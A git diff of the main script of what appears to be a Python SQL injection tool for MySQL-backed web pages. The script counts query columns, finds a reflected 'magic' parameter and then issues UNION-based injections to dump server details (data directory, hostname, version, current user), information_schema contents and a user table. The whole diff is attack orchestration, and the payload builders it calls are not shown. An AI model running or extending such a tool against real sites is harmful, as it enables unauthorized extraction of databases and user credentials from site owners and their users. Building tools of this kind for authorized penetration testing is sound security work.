@@ -21,12 +21,12 @@ if __name__ == '__main__':
 
     page = sys.argv[1]
 
-    # Dicts of useful params for various DBs. 
-    # Turn into text files so user can use their own.
-    mysql_params = ['@@datadir', '@@hostname', '@@version', 'database()', 'user()'] 
+    # whitespace-delimited file
+    mysql_params = open('./lists/mysql/basic_union.txt').read().split()
 
-    builder = builder.Builder(page, mysql_params)
-    inject = injection.Injector("")
+    # Classes
+    build = builder.Builder(page, mysql_params)
+    fang = injection.Injector("")
     report = reporter.Reporter()
     parse = parser.Parser()
 
@@ -39,20 +39,21 @@ if __name__ == '__main__':
     """
 
     # Get number of columns
-    num_columns = inject.get_num_columns(page) 
+    print '\n### Basic Page Structure ###'
+    num_columns = fang.get_num_columns(page) 
     report.columns_in_statement(num_columns)
-
-    print 'Magic Param','\t', inject.get_visible_param(page)
+    magic = int(fang.get_visible_param(page))
+    print 'Magic Param','\t', magic
 
     # Get data
-    data = inject.injection(page, mysql_params, ) 
+    print '\n### Basic DB Info ###'
+    data = fang.injection(page, build.union(num_columns, magic)) 
     report.db_info(parse.db_values(data))
-    #print parse.information_schema(data)
+    data = fang.injection(page, build.schema_union(num_columns, magic)) 
+    print parse.information_schema(data)
 
-    #build = builder.Builder(page, mysql_params)
-    #q = build.schema_union(7,3)['table_name']
-    #print inject.html_diff(inject.get_page(page), inject.get_page(q))
-
-
+    # Get data
+    print '\n### DB Table Info ###'
+    print fang.injection(page, build.user_table(num_columns, magic)) 
 
 
